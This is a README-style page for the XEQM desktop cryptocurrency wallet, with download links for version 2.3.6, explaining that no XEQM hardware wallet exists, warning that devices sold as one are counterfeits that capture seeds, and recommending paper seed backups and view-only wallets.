![XEQM WALLET](assets/banner-article.png)

# XEQM hardware wallet support

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows" /> | Windows 10 or 11, 64-bit | [`XEQM-GUI-2.3.6-win.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe) |
| <img src="https://img.shields.io/badge/macOS-1371E6?style=flat-square&logo=apple&logoColor=white" alt="macOS" /> | macOS, Apple Silicon | [`XEQM-GUI-2.3.6-mac.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg) |
| <img src="https://img.shields.io/badge/Linux-1371E6?style=flat-square&logo=linux&logoColor=white" alt="Linux" /> | x64 Linux, AppImage | [`XEQM-GUI-2.3.6-linux.AppImage`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage) |

</div>


All versions and checksums are on the [XEQM WALLET release page](https://github.com/XEQMFoundation/XEQM-Wallet/releases/tag/v2.3.6).

Requirements follow the platforms the release ships assets for. No minimum OS build or disk figure is published for this tag.

> Only download from this GitHub release page.

There is no XEQM-branded hardware wallet, and no major hardware vendor lists support for the coin. Anything sold as an XEQM device is counterfeit by definition, and a device that claims to hold XEQM through a third-party integration is making a claim the project does not support. The official wallet is desktop software that keeps keys in a file on your machine.

## What a hardware wallet does

It stores a key in a device that never exports it, signs transactions on request, and shows the details on its own screen so malware on the computer cannot silently change them.

That is a real improvement for anyone who signs transactions often. It is also a separate product category with its own vendors, its own firmware and its own supply chain, and none of that exists for XEQM.

## What exists instead

Desktop software with a 25-word seed, an encrypted wallet file, and an optional view-only mode for a second machine. The seed is generated locally, used to restore the wallet anywhere, and never transmitted.

The security model is a paper backup and a clean machine rather than a device with a screen. That is a different trade, and it is the one this wallet makes. [How safe is XEQM WALLET](https://github.com/XEQMFoundation/custody-and-protection/blob/main/how-safe-is-xeqm-wallet.md) covers what it protects.

## Why counterfeit devices appear

A hardware wallet looks like the safest thing in the category, so a product that says "XEQM hardware wallet" borrows that impression without providing the mechanism. Sometimes the device is a generic gadget with a sticker; sometimes it is a way to sell a seed-generation service.

Either way, the thing being sold does not do what a hardware wallet does, and the seed it collects is the whole wallet. [How to spot XEQM phishing](https://github.com/XEQMFoundation/custody-and-protection/blob/main/how-to-spot-xeqm-phishing.md) covers how these are advertised.

## What vendors actually say

At least one major hardware vendor states plainly that it does not support XEQM, and no vendor lists support for it. That is the state of the integration landscape rather than a gap the wallet can close.

If a listing claims support, ask for the vendor's own documentation. A reseller page is not a vendor statement, and a screenshot is not a firmware feature.

## What a device would have to do to help

It would have to hold the key without exporting it, display the destination and amount on its own screen, and sign only what the screen showed. Anything less is a storage case with a cable.

That is why a generic device with a coin's name on it provides no protection even when it works as hardware. The protection is in the firmware's behaviour, not in the shape of the object.

## Why the seed still decides everything

Even with a signing device, a paper backup of the recovery phrase is what survives its loss. The device protects the key in use; the seed protects you after the device is gone.

Here there is no device, so the paper is the whole of the protection. That makes the backup routine more important rather than less. [How to back up XEQM WALLET](https://github.com/XEQMFoundation/custody-and-protection/blob/main/how-to-back-up-xeqm-wallet.md) covers it.

## What to do if you bought one

If you generated or entered a seed on a device sold as an XEQM hardware wallet, treat that seed as compromised. Create a new wallet on a computer you trust, write down the new seed, and move the balance.

Do not wait to see whether anything happens. A seed that has been inside an unknown device has been copied by definition, and moving the funds is the only remedy.

## Can the wallet talk to a device?

No. There is no integration in XEQM WALLET for a hardware signer, and no supported flow that pairs a device with the application.

That means the answer to "can I use my existing device with this wallet" is no, whatever the device supports for other coins. [Which wallets support XEQM](https://github.com/XEQMFoundation/account-guide/blob/main/which-wallets-support-xeqm-coin.md) covers what does hold the coin.

## The closest thing to a hardware split

A view-only wallet on a second machine. Export the public view key from the wallet that can spend, open it on a laptop, and the laptop shows the balance without holding anything that signs.

That is not a hardware wallet: the spending keys still live on a computer. It is, however, a genuine separation that costs nothing and covers the case people usually buy hardware for. [Does XEQM have a mobile app](https://github.com/XEQMFoundation/account-guide/blob/main/does-xeqm-have-a-mobile-app.md) covers the platform question.

## Cold storage without a device

The practical alternative is a wallet on a machine that stays offline, with the seed on paper and the balance restored only when needed. That is cold storage in the original sense, and it has the same weakness as any software wallet: the machine.

It also has one advantage over a device: the seed, not a vendor's firmware, is the thing you have to keep. [How to back up XEQM WALLET](https://github.com/XEQMFoundation/custody-and-protection/blob/main/how-to-back-up-xeqm-wallet.md) covers the backup.

## What to tell someone selling one

Ask which vendor, which firmware version and which documentation states the support. A seller with a real integration can answer in one sentence; a seller with a counterfeit cannot.

Then ask what happens to the seed. If the answer involves the device generating or holding it, the product is a wallet rather than an accessory, and it is not this project's wallet.

## Who the counterfeit hurts most

It hurts the person who buys it, and it hurts the project's credibility when the device fails. A user who loses funds to a fake device concludes the coin is unsafe, which is the opposite of what happened.

That is why the warning is blunt here. There is no product to review, no firmware to update and no vendor to complain to.

## What would have to change

A supported integration would need the vendor to implement the coin and the project to document the flow. Neither exists, which is why this page is short on instructions and long on warnings.

Content here describes what ships. A device that might ship later is not something a reader can buy today. [What is XEQM WALLET](https://github.com/XEQMFoundation/account-guide/blob/main/what-is-xeqm-wallet.md) covers what is available now.

## What this means for long-term holding

Long-term holding here means a paper seed and a machine that is not used for anything else, with the balance restored when you need to move it. It is a discipline rather than a device.

That is the honest trade of a software-only product, and it is why the backup page matters more than this one.

## The summary

No XEQM hardware device, no vendor support, no integration in the wallet. Counterfeits exist and they want your seed. Use the desktop wallet, keep the seed on paper, and use a view-only copy for separation.

That is the whole position, and it is unlikely to change through a purchase. [Someone asked for my XEQM seed](https://github.com/XEQMFoundation/custody-and-protection/blob/main/someone-asked-for-my-xeqm-seed.md) covers what to do when a device asks for the words.

## Frequently asked questions

### Is there an official XEQM hardware wallet?

No. The product is desktop software, and any device branded as XEQM hardware is counterfeit.

### Does any hardware wallet support XEQM?

No vendor lists support for the coin, and at least one states that it does not.

### Can I connect a hardware wallet to XEQM WALLET?

No. There is no integration for a hardware signer in the application.

### What should I do with a device I already bought?

If it generated or received a seed, treat that seed as compromised, create a new wallet and move the balance.

---

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

## Related guides

- [What is XEQM WALLET](https://github.com/XEQMFoundation/account-guide/blob/main/what-is-xeqm-wallet.md)
- [Is XEQM WALLET free and open source](https://github.com/XEQMFoundation/account-guide/blob/main/is-xeqm-wallet-free.md)
- [Does XEQM have a mobile app](https://github.com/XEQMFoundation/account-guide/blob/main/does-xeqm-have-a-mobile-app.md)
